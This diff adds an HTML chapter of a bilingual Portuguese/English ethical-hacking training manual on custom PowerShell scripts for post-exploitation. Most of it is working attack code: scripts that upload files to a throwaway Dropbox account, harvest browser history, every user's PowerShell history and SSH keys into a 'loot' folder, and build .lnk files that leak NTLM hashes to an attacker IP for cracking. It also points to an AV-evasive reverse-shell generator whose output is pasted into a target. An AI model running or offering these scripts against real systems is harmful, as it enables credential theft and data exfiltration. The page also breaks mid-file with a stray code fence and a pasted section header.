@@ -1,0 +1,395 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+<meta charset="UTF-8">
+<title>Cap. 4 — Operational Scripts</title>
+<style>
+:root{--bg:#0d1117;--bg2:#161b22;--bg3:#1c2128;--fg:#c9d1d9;--fg2:#8b949e;--accent:#39d353;--accent2:#58a6ff;--warn:#d29922;--danger:#f85149;--border:#30363d;--code-bg:#0b0f14;--code-fg:#7ee787}
+*{box-sizing:border-box}
+body{margin:0;background:var(--bg);color:var(--fg);font-family:"Segoe UI",Roboto,Helvetica,Arial,sans-serif;line-height:1.65;font-size:16px}
+header{background:linear-gradient(135deg,#0d1117 0%,#161b22 100%);border-bottom:2px solid var(--accent);padding:2rem 1.5rem 1.5rem}
+header h1{margin:0 0 .3rem;font-size:1.9rem;color:var(--accent)}
+header .sub{color:var(--fg2);font-size:.95rem}
+header .meta{margin-top:.8rem;font-size:.85rem;color:var(--fg2)}
+header .meta span{margin-right:1.2rem}
+nav.toc{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1rem 1.2rem;margin:1.5rem auto;max-width:1100px}
+nav.toc h2{margin:0 0 .6rem;font-size:1rem;color:var(--accent2);text-transform:uppercase;letter-spacing:.05em}
+nav.toc ol{margin:0;padding-left:1.3rem;columns:2;column-gap:2rem}
+nav.toc a{color:var(--fg);text-decoration:none}
+nav.toc a:hover{color:var(--accent)}
+main{max-width:1100px;margin:0 auto;padding:0 1.5rem 3rem}
+section{background:var(--bg2);border:1px solid var(--border);border-radius:8px;padding:1.4rem 1.6rem;margin:1.5rem 0}
+section h2{margin-top:0;color:var(--accent2);font-size:1.3rem;border-bottom:1px solid var(--border);padding-bottom:.5rem}
+section h3{color:var(--accent);font-size:1.05rem;margin-top:1.4rem}
+.lang{display:block;margin:.4rem 0}
+.lang .pt::before{content:"🇵🇹 PT ";color:var(--accent);font-weight:600;font-size:.8rem}
+.lang .en::before{content:"🇬🇧 EN ";color:var(--accent2);font-weight:600;font-size:.8rem}
+.lang .pt,.lang .en{display:block;margin:.25rem 0}
+pre{background:var(--code-bg);border:1px solid var(--border);border-left:3px solid var(--accent);border-radius:6px;padding:1rem 1.1rem;overflow-x:auto;font-family:"Cascadia Code","Fira Code",Consolas,monospace;font-size:.88rem;color:var(--code-fg);line-height:1.5}
+code.inline{background:var(--bg3);border:1px solid var(--border);border-radius:4px;padding:.1rem .4rem;font-family:Consolas,monospace;font-size:.88rem;color:var(--accent)}
+table{width:100%;border-collapse:collapse;margin:1rem 0;font-size:.92rem}
+th,td{border:1px solid var(--border);padding:.55rem .7rem;text-align:left;vertical-align:top}
+th{background:var(--bg3);color:var(--accent2)}
+tr:nth-child(even) td{background:rgba(255,255,255,.02)}
+.callout{border-left:4px solid var(--warn);background:rgba(210,153,34,.08);padding:.8rem 1rem;border-radius:0 6px 6px 0;margin:1rem 0}
+.callout.danger{border-left-color:var(--danger);background:rgba(248,81,73,.08)}
+.callout.complement{border-left-color:var(--accent);background:rgba(57,211,83,.06)}
+.callout strong{color:var(--fg)}
+.badge{display:inline-block;font-size:.7rem;font-weight:700;letter-spacing:.05em;padding:.15rem .5rem;border-radius:999px;margin-left:.4rem;vertical-align:middle}
+.badge.orig{background:rgba(88,166,255,.15);color:var(--accent2);border:1px solid var(--accent2)}
+.badge.comp{background:rgba(57,211,83,.12);color:var(--accent);border:1px solid var(--accent)}
+.badge.impact{background:rgba(248,81,73,.12);color:var(--danger);border:1px solid var(--danger)}
+ul.checklist{list-style:none;padding-left:0}
+ul.checklist li::before{content:"☐ ";color:var(--accent);font-weight:700;margin-right:.3rem}
+footer{border-top:1px solid var(--border);margin-top:3rem;padding:1.5rem;text-align:center;color:var(--fg2);font-size:.85rem}
+footer a{color:var(--accent2);text-decoration:none}
+@media (max-width:720px){nav.toc ol{columns:1}header h1{font-size:1.4rem}}
+</style>
+</head>
+<body>
+<header>
+<h1>Cap. 4 — Operational Scripts</h1>
+<div class="sub">Ch. 4 — Operational Scripts</div>
+<div class="meta"><span>📖 Manual de Formação Ethical Hacker</span><span>🎯 Nível: Intermédio / Intermediate</span></div>
+</header>
+<nav class="toc">
+<h2>Índice / Table of Contents</h2>
+<ol>
+<li><a href="#obj">Objetivos</a></li><li><a href="#ctx">Contexto</a></li>
+<li><a href="#dropbox">Dropbox</a></li><li><a href="#browser">Browser</a></li>
+<li><a href="#history">PS History</a></li><li><a href="#smb">SMB Leak</a></li>
+<li><a href="#ssh">SSH Keys</a></li><li><a href="#revshell">Revshell</a></li>
+<li><a href="#impact">Impact Scripts</a></li><li><a href="#mitre">MITRE</a></li>
+<li><a href="#mitig">Mitigações</a></li><li><a href="#lab">Laboratório</a></li>
+<li><a href="#revq">Revisão</a></li><li><a href="#sum">Resumo</a></li>
+</ol>
+</nav>
+<main>
+<section id="obj">
+<h2>1. Objetivos de Aprendizagem / Learning Objectives</h2>
+<div class="lang">
+<span class="pt">Compreender quando ferramentas <em>off-the-shelf</em> não chegam e é preciso escrever scripts próprios; exfiltrar ficheiros para Dropbox; extrair histórico e bookmarks de browsers; extrair histórico PowerShell de todos os perfis; criar atalhos <code class="inline">.lnk</code> para SMB Hash Leak; exfiltrar chaves SSH em Base64; gerar reverse shells AV-evasivos; construir scripts de impacto com output útil e evidência para relatório.</span>
+<span class="en">Understand when off-the-shelf tools fall short and custom scripts are needed; exfiltrate files to Dropbox; extract browser history and bookmarks; extract PowerShell history from all profiles; craft <code class="inline">.lnk</code> shortcuts for SMB Hash Leak; exfiltrate SSH keys in Base64; generate AV-evasive reverse shells; build impact scripts with useful output and report evidence.</span>
+</div>
+</section>
+
+<section id="ctx">
+<h2>2. Contexto e Relevância / Context and Relevance <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Há alturas em que as ferramentas <em>off-the-shelf</em> não fazem exatamente o que precisas, ou em que tarefas repetitivas começam a consumir tempo e atenção. É aí que deves desenvolver os teus próprios scripts, ajustados e eficientes, sem <em>overhead</em> desnecessário. O PowerShell é flexível e permite fazer as coisas rapidamente. Cada script abaixo vem com um README para começar; testa, ajusta e constrói em cima deles.</span>
+<span class="en">There are times when off-the-shelf tools don't do exactly what you need, or when repetitive tasks start eating time and attention. That's when you should develop your own scripts, tailored and efficient, without unnecessary overhead. PowerShell is flexible and lets you get things done fast. Each script below comes with a README to get started; test, tweak, and build on them.</span>
+</div>
+</section>
+
+<section id="dropbox">
+<h2>3. Exfiltração para Dropbox / File Exfiltration to Dropbox <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Quando não podes usar RDP ou Mega, ter uma forma rápida de empurrar ficheiros para fora ajuda. Este script PowerShell carrega ficheiros para o Dropbox com o mínimo de complicações. Adaptado do original de I-Am-Jacoby para lidar com nomes de ficheiro não-ingleses: qualquer ficheiro com nome estrangeiro é copiado para <code class="inline">C:\Users\Public\Documents</code> com um nome aleatório, carregado e depois apagado localmente.</span>
+<span class="en">When you can't use RDP or Mega, having a quick way to push files out helps. This PowerShell script uploads files to Dropbox with minimal fuss. Adapted from I-Am-Jacoby's original to handle non-English filenames: any file with a foreign name is copied to <code class="inline">C:\Users\Public\Documents</code> under a random filename, uploaded, then deleted locally.</span>
+</div>
+<h3>3.1 Setup</h3>
+<div class="lang">
+<span class="pt">Criar conta Dropbox com email descartável; gerar <strong>access token</strong> no developer console; adicionar o token ao script.</span>
+<span class="en">Create a Dropbox account with a throwaway email; generate an <strong>access token</strong> in the developer console; add the token to the script.</span>
+</div>
+<h3>3.2 Usage</h3>
+<pre>PS > . .\dropbox.ps1
+PS > "file.txt" | DropBox-Upload</pre>
+<h3>3.3 Implementação de referência <span class="badge comp">Complementar</span></h3>
+<div class="lang">
+<span class="pt">O artigo não inclui o código-fonte. A implementação abaixo reproduz a lógica descrita.</span>
+<span class="en">The article doesn't include the source. The implementation below reproduces the described logic.</span>
+</div>
+<pre>$script:DropboxToken = "YOUR_TOKEN_HERE"
+function DropBox-Upload {
+  param([Parameter(ValueFromPipeline)]$Path)
+  process {
+    if (-not (Test-Path $Path)) { Write-Warning "Not found: $Path"; return }
+    $tmp = Join-Path "C:\Users\Public\Documents" "$([guid]::NewGuid().ToString('N')).tmp"
+    Copy-Item $Path $tmp -Force
+    $apiArg = @{ path="/$([IO.Path]::GetFileName($tmp))"; mode="add"; autorename="true"; mute="false" } | ConvertTo-Json -Compress
+    $h = @{ Authorization="Bearer $script:DropboxToken"; "Dropbox-API-Arg"=$apiArg; "Content-Type"="application/octet-stream" }
+    try { Invoke-RestMethod -Uri "https://content.dropboxapi.com/2/files/upload" -Method Post -Headers $h -InFile $tmp; Write-Host "[+] Uploaded: $Path" -ForegroundColor Green }
+    catch { Write-Warning "Upload failed: $($_.Exception.Message)" }
+    finally { Remove-Item $tmp -Force -ErrorAction SilentlyContinue }
+  }
+}</pre>
+</section>
+<section id="browser">
+<h2>4. Browser History &amp; Bookmarks Exfiltration <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O histórico e os bookmarks do browser revelam onde os utilizadores vão e o que guardam. Este script extrai dados do Chrome ou Edge para veres sites guardados, páginas de login e mais.</span>
+<span class="en">Browser history and bookmarks reveal where users go and what they store. This script pulls data from Chrome or Edge so you can see saved sites, login pages, and more.</span>
+</div>
+<h3>4.1 Usage</h3>
+<pre>PS > . .\browser.ps1
+PS > Get-BrowserData -Browser chrome -DataType history
+PS > Get-BrowserData -Browser edge -DataType bookmarks</pre>
+<h3>4.2 Implementação de referência <span class="badge comp">Complementar</span></h3>
+<div class="lang">
+<span class="pt">A base <code class="inline">History</code> fica bloqueada enquanto o browser corre — copia para <code class="inline">%TEMP%</code> e consulta com <code class="inline">sqlite3.exe</code>. Os <code class="inline">Bookmarks</code> são JSON.</span>
+<span class="en">The <code class="inline">History</code> DB is locked while the browser runs — copy to <code class="inline">%TEMP%</code> and query with <code class="inline">sqlite3.exe</code>. <code class="inline">Bookmarks</code> are JSON.</span>
+</div>
+<pre>function Get-BrowserData {
+  param([ValidateSet('chrome','edge')][string]$Browser,[ValidateSet('history','bookmarks')][string]$DataType)
+  $root = switch ($Browser) { 'chrome' { "$env:LOCALAPPDATA\Google\Chrome\User Data\Default" } 'edge' { "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default" } }
+  if ($DataType -eq 'history') {
+    $tmp = Join-Path $env:TEMP "hist_$([guid]::NewGuid().ToString('N')).db"
+    Copy-Item "$root\History" $tmp -Force
+    & sqlite3 $tmp "SELECT url,title,datetime(last_visit_time/1000000-11644473600,'unixepoch') AS lv FROM urls ORDER BY last_visit_time DESC LIMIT 50;"
+    Remove-Item $tmp -Force
+  } else {
+    (Get-Content "$root\Bookmarks" -Raw | ConvertFrom-Json).roots.bookmark_bar.children | Select name,url
+  }
+}</pre>
+</section>
+
+<section id="history">
+<h2>5. PowerShell Command History Exfiltration <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">O teu histórico PowerShell pode conter comandos, credenciais ou caminhos de rede. Este script recolhe o <code class="inline">ConsoleHost_history.txt</code> de cada utilizador e guarda-o para inspeção.</span>
+<span class="en">Your PowerShell history can contain commands, credentials, or network paths. This script gathers each user's <code class="inline">ConsoleHost_history.txt</code> and saves it for inspection.</span>
+</div>
+<h3>5.1 Preview one-liner</h3>
+<pre>Get-ChildItem C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt -EA SilentlyContinue | %{ $u=$_.FullName.Split('\')[2]; Write-Host "`n=== $u ==="; Get-Content $_.FullName }</pre>
+<div class="lang">
+<span class="pt">O wildcard <code class="inline">*</code> enumera todos os perfis; <code class="inline">Split('\')[2]</code> extrai o username.</span>
+<span class="en">The <code class="inline">*</code> wildcard enumerates all profiles; <code class="inline">Split('\')[2]</code> extracts the username.</span>
+</div>
+<h3>5.2 Usage</h3>
+<pre>PS > .\history.ps1</pre>
+<h3>5.3 Implementação de referência <span class="badge comp">Complementar</span></h3>
+<pre>$out=".\loot\history_all.txt"; New-Item -ItemType Directory -Path ".\loot" -Force | Out-Null; ""|Out-File $out -Encoding UTF8
+Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -EA SilentlyContinue | %{
+  $u=$_.FullName.Split('\')[2]; "`n=== $u ==="|Out-File $out -Append -Encoding UTF8; Get-Content $_.FullName|Out-File $out -Append -Encoding UTF8; Write-Host "[+] $u" -ForegroundColor Green
+}
+Write-Host "[+] Saved: $out" -ForegroundColor Green</pre>
+</section>
+
+<section id="smb">
+<h2>6. SMB Hash Leak <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Este script cria atalhos <code class="inline">.lnk</code> a apontar para um share SMB inexistente. Quando os utilizadores abrem ou pré-visualizam o link, a máquina envia um hash NTLM para o teu servidor. Capturas com Responder ou Inveigh e crackeas offline. Escolhe nomes de ficheiro que se integrem em shares existentes para evitar suspeita.</span>
+<span class="en">This script crafts <code class="inline">.lnk</code> shortcuts pointing to a nonexistent SMB share. When users open or preview the link, their machine sends an NTLM hash to your server. You capture it with Responder or Inveigh and crack it offline. Pick filenames that fit into existing shares to avoid suspicion.</span>
+</div>
+<h3>6.1 Usage</h3>
+<pre>PS > . .\leak.ps1
+PS > Create-SMBHashLeakLnk -LnkFilePath ".\grab.lnk" -SmbSharePath "\\192.168.254.43\share\file.exe" -Description "Please wait..."</pre>
+<h3>6.2 Implementação de referência <span class="badge comp">Complementar</span></h3>
+<pre>function Create-SMBHashLeakLnk {
+  param([Parameter(Mandatory)][string]$LnkFilePath,[Parameter(Mandatory)][string]$SmbSharePath,[string]$Description="Please wait...",[string]$IconLocation="shell32.dll,1")
+  $full=[IO.Path]::GetFullPath($LnkFilePath); $ws=New-Object -ComObject WScript.Shell; $lnk=$ws.CreateShortcut($full)
+  $lnk.TargetPath=$SmbSharePath; $lnk.Description=$Description; $lnk.IconLocation=$IconLocation; $lnk.Save()
+  Write-Host "[+] Created: $full -> $SmbSharePath" -ForegroundColor Green
+}</pre>
+<h3>6.3 Listener e cracking</h3>
+<pre>responder -I eth0 -wrv
+Invoke-Inveigh -ConsoleOutput Y -NBNS Y -HTTP Y -SMB Y
+hashcat -m 5600 hashes.txt wordlist.txt</pre>
+</section>
+<section id="ssh">
+<h2>7. SSH Key Exfiltration <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Este script exfiltra chaves SSH dos locais por omissão e codifica todos os dados recolhidos em Base64. Se necessário, podes especificar um diretório personalizado. Para ler os dados extraídos, descodifica o output Base64.</span>
+<span class="en">This script exfiltrates SSH keys from default locations and encodes all collected data in Base64. If needed, you can specify a custom directory. To read the extracted data, decode the Base64 output.</span>
+</div>
+<h3>7.1 Usage</h3>
+<pre>PS > . .\ssh.ps1
+PS > $data = Get-Ssh
+PS > $data = Get-Ssh -sshKeyDirectoryPath "C:\Custom\Path\To\.ssh"
+PS > [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String($data))</pre>
+<h3>7.2 Implementação de referência <span class="badge comp">Complementar</span></h3>
+<pre>function Get-Ssh {
+  param([string]$sshKeyDirectoryPath="$env:USERPROFILE\.ssh")
+  if (-not (Test-Path $sshKeyDirectoryPath)) { Write-Warning "Not found"; return $null }
+  $blob = foreach ($f in Get-ChildItem $sshKeyDirectoryPath -File -EA SilentlyContinue) { "`n### $($f.Name) ###`n" + (Get-Content $f.FullName -Raw) }
+  return [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes(($blob -join "")))
+}</pre>
+</section>
+<section id="revshell">
+<h2>8. Bónus — Reverse Shells AV-evasivos / AV-evasive Reverse Shells <span class="badge orig">Original</span></h2>
+<div class="lang">
+<span class="pt">Ferramenta criada por I-Am-Jakoby que gera reverse shells PowerShell AV-evasivos. São <strong>polimórficos</strong> — cada um é ligeiramente diferente a cada geração. A maioria dos motores AV, incluindo o Defender, ainda não os deteta. Vai a <code class="inline">https://powershellforhackers.com/tools/revshell</code>, insere IP e porta do C2, e o tool gera o shell. Cola no terminal alvo. Garante que o listener está ativo antes de executar.</span>
+<span class="en">Tool created by I-Am-Jakoby that generates AV-evasive PowerShell reverse shells. They are <strong>polymorphic</strong> — each is slightly different every generation. Most AV engines, including Defender, still miss them. Go to <code class="inline">https://powershellforhackers.com/tools/revshell</code>, enter C2 IP and port, and the tool generates the shell. Paste it into the target terminal. Make sure the listener is running before executing.</span>
+</div>
+<pre>c2 > nc -lvnp 9001</pre>
+<div class="lang">
+<span class="pt">Fluxo: (1) listener no C2; (2) gerar payload no site com IP:porta; (3) colar no alvo; (4) shell liga de volta.</span>
+<span class="en">Flow: (1) listener on C2; (2) generate payload with IP:port; (3) paste on target; (4) shell connects back.</span>
+</div>
+</section>
+<section id="impact">
+<h2>9. Scripts de Impacto / Impact Scripts <span class="badge impact">Impacto</span> <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt">Os scripts acima são úteis isoladamente. Em engagement real, precisas de orquestrar, consolidar e reportar. Os scripts abaixo fazem isso: recolhem tudo para uma pasta <code class="inline">loot</code>, geram um manifesto com hashes, e produzem um relatório legível.</span>
+<span class="en">The scripts above are useful in isolation. In a real engagement, you need to orchestrate, consolidate, and report. The scripts below do that: collect everything into a <code class="inline">loot</code> folder, generate a manifest with hashes, and produce a readable report.</span>
+</div>
+<h3>9.1 Script 4.1 — Coletor Unificado / Unified Collector</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> correr todos os coletores (browser, history, SSH) para uma pasta <code class="inline">loot</code>, com timestamp. <strong>Evidência:</strong> pasta <code class="inline">loot\run_*\</code> + log.</span>
+<span class="en"><strong>Goal:</strong> run all collectors (browser, history, SSH) into a <code class="inline">loot</code> folder with timestamp. <strong>Evidence:</strong> <code class="inline">loot\run_*\</code> folder + log.</span>
+</div>
+<pre>param([string]$OutDir=".\loot"); $ErrorActionPreference="Continue"
+$run=Join-Path $OutDir "run_$(Get-Date -Format 'yyyyMMdd_HHmmss')"; New-Item -ItemType Directory -Path $run -Force|Out-Null
+$log=Join-Path $run "collector.log"; function Log($m){$l="[$(Get-Date -Format 'HH:mm:ss')] $m";Write-Host $l;$l|Out-File $log -Append -Encoding UTF8}
+Log "Start $run"
+foreach($b in @('chrome','edge')){foreach($t in @('history','bookmarks')){try{Log "$b/$t";Get-BrowserData -Browser $b -DataType $t|Out-File (Join-Path $run "$b-$t.txt") -Encoding UTF8}catch{Log "FAIL $($_.Exception.Message)"}}}
+try{Log "PSHistory"; Get-ChildItem "C:\Users\*\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt" -EA SilentlyContinue|%{$u=$_.FullName.Split('\')[2];"`n=== $u ==="|Out-File (Join-Path $run "pshistory.txt") -Append -Encoding UTF8;Get-Content $_.FullName|Out-File (Join-Path $run "pshistory.txt") -Append -Encoding UTF8}}catch{Log "FAIL $($_.Exception.Message)"}
+try{Log "SSH";$b64=Get-Ssh;if($b64){$b64|Out-File (Join-Path $run "ssh.b64") -Encoding UTF8}}catch{Log "FAIL $($_.Exception.Message)"}
+Log "Done $run"</pre>
+<h3>9.2 Script 4.2 — Manifesto com Hashes / Manifest</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> gerar um manifesto SHA256 de todos os ficheiros recolhidos. <strong>Evidência:</strong> <code class="inline">manifest.sha256</code>.</span>
+<span class="en"><strong>Goal:</strong> generate a SHA256 manifest of all collected files. <strong>Evidence:</strong> <code class="inline">manifest.sha256</code>.</span>
+</div>
+<pre>param([Parameter(Mandatory)][string]$Path)
+$out=Join-Path $Path "manifest.sha256"
+Get-ChildItem $Path -Recurse -File|?{$_.Name -ne "manifest.sha256"}|%{"$((Get-FileHash $_.FullName -Algorithm SHA256).Hash)  $($_.FullName)"}|Out-File $out -Encoding UTF8
+Write-Host "[+] $out" -ForegroundColor Green; Get-Content $out</pre>
+<h3>9.3 Script 4.3 — Relatório de Exfiltração / Report</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> produzir um relatório Markdown com contagens e caminho dos ficheiros. <strong>Evidência:</strong> <code class="inline">exfil-report.md</code>.</span>
+<span class="en"><strong>Goal:</strong> produce a Markdown report with counts and file paths. <strong>Evidence:</strong> <code class="inline">exfil-report.md</code>.</span>
+</div>
+<pre>param([Parameter(Mandatory)][string]$RunDir)
+$files=Get-ChildItem $RunDir -File
+$md=@"
+# Exfiltration Report
+**Run:** $(Split-Path $RunDir -Leaf)
+**Date:** $(Get-Date -Format "yyyy-MM-dd HH:mm")
+**Host:** $env:COMPUTERNAME
+**User:** $env:USERNAME
+## Artifacts
+| File | Size |
+|------|------|
+$($files|%{"| $($_.Name) | $($_.Length) |"}|Out-String)
+## SHA256
+"@
+$out=Join-Path $RunDir "exfil-report.md"; $md|Out-File $out -Encoding UTF8; Write-Host "[+] $out" -ForegroundColor Green</pre>
+<h3>9.4 Script 4.4 — Verificador de Pré-requisitos / Prerequisite Checker</h3>
+<div class="lang">
+<span class="pt"><strong>Objetivo:</strong> verificar se <code class="inline">sqlite3.exe</code>, <code class="inline">Get-Ssh</code>, <code class="inline">Get-BrowserData</code> e permissões estão OK. <strong>Evidência:</strong> output do checker.</span>
+<span class="en"><strong>Goal:</strong> check if <code class="inline">sqlite3.exe</code>, <code class="inline">Get-Ssh</code>, <code class="inline">Get-BrowserData</code>, and permissions are OK. <strong>Evidence:</strong> checker output.</span>
+</div>
+<pre>$c=[ordered]@{
+ "sqlite3"=[bool](Get-Command sqlite3.exe -EA SilentlyContinue)
+ "Get-Ssh"=[bool](Get-Command Get-Ssh -EA SilentlyContinue)
+ "Get-BrowserData"=[bool](Get-Command Get-BrowserData -EA SilentlyContinue)
+ "Chrome"=Test-Path "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
+ "Edge"=Test-Path "$env:LOCALAPPDATA\Microsoft\Edge\User Data\Default"
+ ".ssh"=Test-Path "$env:USERPROFILE\.ssh"
+ "C:\Users"=$null -ne (Get-ChildItem "C:\Users" -EA SilentlyContinue)
+}
+$c.GetEnumerator()|%{$col=if($_.Value){"Green"}else{"Red"};$m=if($_.Value){"[+]"}else{"[x]"};Write-Host "$m $($_.Key)" -ForegroundColor $col}
+Write-Host "`n[i] Fix failures before running collectors." -ForegroundColor Cyan</pre>
+<div class="callout danger">
+<strong>⚠️ Regras de uso / Usage rules:</strong>
+<div class="lang">
+<span class="pt">Estes scripts são para <strong>laboratório isolado e engagements autorizados</strong>. Registar sempre: data/hora, conta usada, host, hash dos ficheiros exportados. Nunca exfiltrar dados reais sem autorização escrita.</span>
+<span class="en">These scripts are for <strong>isolated labs and authorized engagements</strong>. Always log: date/time, account used, host, hash of exported files. Never exfiltrate real data without written authorization.</span>
+</div>
+</div>
+</section>
+```
+
+---
+
+**Bloco 6 — Secções 10–14 + fecho do ficheiro:**
+
+```html
+<section id="mitre">
+<h2>10. Mapeamento MITRE ATT&amp;CK <span class="badge comp">Complementar</span></h2>
+<table>
+<tr><th>Técnica</th><th>ID</th><th>Onde</th></tr>
+<tr><td>Exfiltration to Cloud Storage</td><td>T1567.002</td><td>Dropbox</td></tr>
+<tr><td>Local Data Staging</td><td>T1074.001</td><td>Dropbox (tmp Public\Documents)</td></tr>
+<tr><td>Credentials from Web Browsers</td><td>T1555.003</td><td>Browser</td></tr>
+<tr><td>Credentials In Files</td><td>T1552.001</td><td>PS History</td></tr>
+<tr><td>Private Keys</td><td>T1552.004</td><td>SSH Keys</td></tr>
+<tr><td>Forced Authentication</td><td>T1187</td><td>SMB Hash Leak</td></tr>
+<tr><td>User Execution: Malicious File</td><td>T1204.002</td><td>.lnk</td></tr>
+<tr><td>PowerShell</td><td>T1059.001</td><td>Todo o capítulo</td></tr>
+<tr><td>Obfuscated Files</td><td>T1027</td><td>Base64, revshell</td></tr>
+<tr><td>Ingress Tool Transfer</td><td>T1105</td><td>Reverse shell</td></tr>
+</table>
+</section>
+
+<section id="mitig">
+<h2>11. Mitigações Blue Team / Mitigations <span class="badge comp">Complementar</span></h2>
+<ol>
+<li><strong>Egress filtering</strong> com allowlist — bloqueia Dropbox, Pastebin, IPs de C2.</li>
+<li><strong>Monitorizar acesso a <code class="inline">History</code>/<code class="inline">Bookmarks</code></strong> (Sysmon FileAccess) e cópias para <code class="inline">%TEMP%</code>.</li>
+<li><strong>Proteger <code class="inline">.ssh</code></strong> com ACLs; usar SSH agent.</li>
+<li><strong>Monitorizar leitura massiva de <code class="inline">ConsoleHost_history.txt</code></strong> em <code class="inline">C:\Users\*</code>.</li>
+<li><strong>SMB signing + desativar NTLMv1 + <code class="inline">RestrictSendingNTLMToRemote</code></strong>.</li>
+<li><strong>Bloquear criação de <code class="inline">.lnk</code></strong> em shares e monitorizar (Sysmon 11).</li>
+<li><strong>AMSI + Script Block Logging (4104)</strong> — deteta <code class="inline">Invoke-RestMethod</code>, Base64, revshell.</li>
+<li><strong>Constrained Language Mode + AppLocker</strong> — bloqueia SQLite assembly e scripts não assinados.</li>
+<li><strong>DLP</strong> para uploads cloud e Base64 em CLI.</li>
+<li><strong>Honeytokens</strong> — ficheiros <code class="inline">.ssh</code> falsos, histórico com iscas.</li>
+</ol>
+</section>
+
+<section id="lab">
+<h2>12. Exercício de Laboratório / Lab Exercise <span class="badge comp">Complementar</span></h2>
+<div class="lang">
+<span class="pt"><strong>Cenário:</strong> VM Windows 10/11 isolada (host-only), com Chrome e Edge instalados, um utilizador com histórico PowerShell e uma pasta <code class="inline">.ssh</code> de teste. Kali na mesma rede para o passo 5. Snapshot antes. <strong>Objetivo:</strong> correr os coletores, gerar manifesto e relatório.</span>
+<span class="en"><strong>Scenario:</strong> Isolated Windows 10/11 VM (host-only), with Chrome and Edge installed, a user with PowerShell history, and a test <code class="inline">.ssh</code> folder. Kali on the same network for step 5. Snapshot before. <strong>Goal:</strong> run collectors, generate manifest and report.</span>
+</div>
+<table>
+<tr><th>#</th><th>Tarefa</th><th>Comando</th><th>Evidência</th></tr>
+<tr><td>1</td><td>Pré-requisitos</td><td><code class="inline">.\prereq-check.ps1</code></td><td>Output</td></tr>
+<tr><td>2</td><td>Coletor unificado</td><td><code class="inline">.\collect-all.ps1 -OutDir .\loot</code></td><td><code class="inline">loot\run_*\</code></td></tr>
+<tr><td>3</td><td>Manifesto</td><td><code class="inline">.\manifest.ps1 -Path .\loot\run_*</code></td><td><code class="inline">manifest.sha256</code></td></tr>
+<tr><td>4</td><td>Relatório</td><td><code class="inline">.\exfil-report.ps1 -RunDir .\loot\run_*</code></td><td><code class="inline">exfil-report.md</code></td></tr>
+<tr><td>5</td><td>SMB Hash Leak (lab)</td><td><code class="inline">Create-SMBHashLeakLnk -LnkFilePath .\grab.lnk -SmbSharePath "\\KALI_IP\share\x.exe"</code></td><td>PCAP + hash</td></tr>
+<tr><td>6</td><td>SSH decode</td><td><code class="inline">[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String((Get-Content .\loot\run_*\ssh.b64)))</code></td><td>Chaves em claro</td></tr>
+<tr><td>7</td><td>(Defensivo) Evento 4104</td><td><code class="inline">Get-WinEvent -LogName "Microsoft-Windows-PowerShell/Operational" -MaxEvents 50 | ? Id -eq 4104</code></td><td>Eventos</td></tr>
+<tr><td>8</td><td>(Defensivo) SMB signing</td><td><code class="inline">Get-SmbServerConfiguration | Select RequireSecuritySignature</code></td><td>Valor</td></tr>
+</table>
+<h3>Checklist de evidências / Evidence checklist</h3>
+<ul class="checklist">
+<li>Snapshot inicial</li>
+<li><code class="inline">prereq-check</code> output</li>
+<li>Pasta <code class="inline">loot\run_*\</code> completa</li>
+<li><code class="inline">manifest.sha256</code></li>
+<li><code class="inline">exfil-report.md</code></li>
+<li>PCAP do SMB Hash Leak</li>
+<li>Evento 4104 capturado</li>
+<li>Snapshot final</li>
+</ul>
+</section>
+
+<section id="revq">
+<h2>13. Perguntas de Revisão / Review Questions <span class="badge comp">Complementar</span></h2>
+<ol>
+<li>Porque é que o Dropbox script copia para <code class="inline">C:\Users\Public\Documents</code> com nome aleatório?</li>
+<li>Porque é que a base <code class="inline">History</code> do Chrome precisa de ser copiada antes de lida?</li>
+<li>O que é <em>dot-sourcing</em> e porque é usado?</li>
+<li>Como funciona o SMB Hash Leak e que ferramenta o captura?</li>
+<li>Porque é que as chaves SSH são codificadas em Base64?</li>
+<li>O que torna um reverse shell polimórfico?</li>
+<li>Qual a utilidade do manifesto SHA256?</li>
+<li>Como se deteta exfiltração no blue team?</li>
+</ol>
+</section>
+
+<section id="sum">
+<h2>14. Resumo do Capítulo / Chapter Summary</h2>
+<div class="lang">
+<span class="pt">Este capítulo mostrou quando e como escrever scripts operacionais próprios: exfiltração para Dropbox, extração de histórico e bookmarks de browsers, recolha de histórico PowerShell, criação de atalhos <code class="inline">.lnk</code> para SMB Hash Leak, exfiltração de chaves SSH em Base64 e reverse shells AV-evasivos. Acrescentámos <strong>quatro scripts de impacto</strong> (coletor unificado, manifesto SHA256, relatório de exfiltração e verificador de pré-requisitos) que transformam operações isoladas num fluxo de engagement com evidência auditável. O Cap. 5 (Crash and Burn) entra nas técnicas destrutivas.</span>
+<span class="en">This chapter showed when and how to write your own operational scripts: Dropbox exfiltration, browser history/bookmarks extraction, PowerShell history collection, <code class="inline">.lnk</code> shortcut creation for SMB Hash Leak, SSH key exfiltration in Base64, and AV-evasive reverse shells. We added <strong>four impact scripts</strong> (unified collector, SHA256 manifest, exfiltration report, and prerequisite checker) that turn isolated operations into an engagement flow with auditable evidence. Ch. 5 (Crash and Burn) moves into destructive techniques.</span>
+</div>
+</section>
+
+</main>
+<footer>
+<div>Manual de Formação Ethical Hacker — Cap. 4 / Ethical Hacker Training Manual — Ch. 4</div>
+<div style="margin-top:.6rem">
